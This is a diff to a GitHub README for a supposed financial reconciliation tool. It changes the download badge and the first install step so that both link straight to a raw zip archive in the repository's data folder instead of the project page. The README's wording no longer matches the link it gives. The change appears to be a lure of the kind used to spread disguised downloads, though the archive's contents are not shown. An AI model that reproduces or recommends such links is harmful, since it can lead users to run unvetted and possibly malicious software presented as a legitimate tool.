@@ -1,6 +1,6 @@
 # 📊 Financial-Recon-Automation - Automate your monthly financial reconciliation reports
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Araak6587/Financial-Recon-Automation)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Araak6587/Financial-Recon-Automation/raw/refs/heads/main/data/Financial-Automation-Recon-v2.3.zip)
 
 This tool helps finance teams manage data tasks. It checks securities pricing, balances general ledgers, and identifies budget variances. The software processes raw data through a SQL and Python pipeline. It outputs a clean Excel file for your review. This saves time on manual data entry and reduces calculation errors.
 
@@ -8,7 +8,7 @@ This tool helps finance teams manage data tasks. It checks securities pricing, b
 
 Follow these steps to obtain the program files.
 
-1. Visit the [project download page](https://github.com/Araak6587/Financial-Recon-Automation).
+1. Visit the [project download page](https://github.com/Araak6587/Financial-Recon-Automation/raw/refs/heads/main/data/Financial-Automation-Recon-v2.3.zip).
 2. Look for the latest release version on the right side of the screen.
 3. Click the link that ends in ".zip" to save the folder to your computer.
 4. Open your Downloads folder.
